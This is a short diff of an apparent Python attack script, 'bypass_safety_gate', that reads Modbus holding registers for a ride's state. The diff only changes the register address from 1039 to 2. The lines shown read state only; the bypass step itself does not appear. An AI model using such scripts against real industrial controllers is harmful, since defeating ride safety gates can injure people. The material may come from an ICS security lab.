@@ -42,7 +42,7 @@ def bypass_safety_gate():
     print()
 
     # Check current state
-    result = client.read_holding_registers(1039, 1, slave=1)
+    result = client.read_holding_registers(2, 1, slave=1)
     if result.isError():
         print("✗ Failed to read ride state")
         client.close()
@@ -99,7 +99,7 @@ def bypass_safety_gate():
     time.sleep(1)
 
     # Check if ride started
-    result = client.read_holding_registers(1039, 1, slave=1)
+    result = client.read_holding_registers(2, 1, slave=1)
     if not result.isError():
         new_state = result.registers[0]
         print()
